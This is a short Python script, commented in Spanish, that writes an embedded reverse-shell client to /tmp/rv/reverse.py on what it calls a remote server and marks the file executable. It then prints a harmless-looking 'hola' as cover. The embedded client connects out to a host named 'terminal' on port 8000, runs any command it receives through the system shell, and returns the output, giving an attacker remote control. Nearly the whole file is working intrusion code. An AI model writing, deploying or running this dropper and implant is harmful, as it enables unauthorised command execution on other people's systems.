import os

if __name__ == '__main__':
    #payload de reverse shell
	payload = '''
import socket
import sys
import subprocess
import threading 
import os


# Variables Globales
host = 'terminal'
puerto = int(8000)
FIN_COMANDO = b'#00#'

def mandar_comando(comando, socket):
    """
    Envía el comando a través del socket, haciendo conversiones necesarias
    Espera la respuesta del servidor y la regresa
    comando viene como str
    """
    comando += FIN_COMANDO
    socket.send(comando)

def ejecutar_comando(comando):
    """
    Esta función ejecuta un comando y regresa la salida binaria producida
    En caso de error la función regresa False
    Comando viene como cadena binaria
    """
    comando = comando.decode('utf-8') 
    #print(comando)
    proc = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    salida, error = proc.communicate()
    if error:
        return False
    return salida

def leer_comando(cliente):
    print('Reading commands..................')
    """
    ! Lee el canal de comunicacion del cliente y reconstruye el comando asociado
    """
    comando = cliente.recv(2048)
    #print(comando)
    while not comando.endswith(FIN_COMANDO):
        comando += cliente.recv(2048)
    quitar_caracteres = len(FIN_COMANDO)
    return comando[:-quitar_caracteres]

def atender_servidor(cliente):
    comando = ''
    while comando != b'exit':
        comando = leer_comando(cliente)
        if comando.startswith(b'cd'):
            ruta = extraer_ruta_cd(comando)
            if ruta == False:
                salida = False
            else:
                salida = ejecutar_cd(ruta)
        else:
            salida = ejecutar_comando(comando)
            #print(salida)
        if salida == False:
            mandar_mensaje(b'command not found', cliente)
        else:
            mandar_mensaje(salida, cliente)
    cliente.close()

def ejecutar_cd(ruta):
    try:
        os.chdir(ruta)
        return b''
    except FileNotFoundError:
        return False

# * Extraer ruta del cd
def extraer_ruta_cd(comando):
    """
    ! Exclusivo para parsear el comando cd
    ! Regresamos la ruta
    """
    partes = comando.split(b' ')
    if len(partes) != 2: # ! Error
        return False
    return partes[1]

def mandar_mensaje(mensaje, socket):
    """
    Envia un mensaje a través del socket establecido
    El mensaje debe ser una cadena binaria
    """
    mensaje += FIN_COMANDO
    socket.send(mensaje)

def inicializar_conexion(host, puerto):
    cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try: 
            cliente.connect((host, puerto))
        except:
            print('Se rechazo la conexion')
            exit(1)
        return cliente

if __name__ == '__main__':
    #var = input()
    socket = inicializar_conexion(host, puerto)
    # ! Creamos el hilo para establecer la consola y no se cierre
    shell = threading.Thread(target=atender_servidor, args=(socket, ))
    shell.start()
    #print(var)'''
    #Ejecucion de codigo en el servidor
	os.system('mkdir -p /tmp/rv/') #Se crea una carpeta en el servidor remoto
	ex = open('/tmp/rv/reverse.py','w+')
	ex.write(payload) #Se escribe el texto en reverse.py
	ex.close() #Se cierra el archivo
	os.system('chmod +x /tmp/rv/reverse.py') #Perimisos al archivo reverse.py
    
	test = "hola" #Codigo que evalua el sistema
	print(test)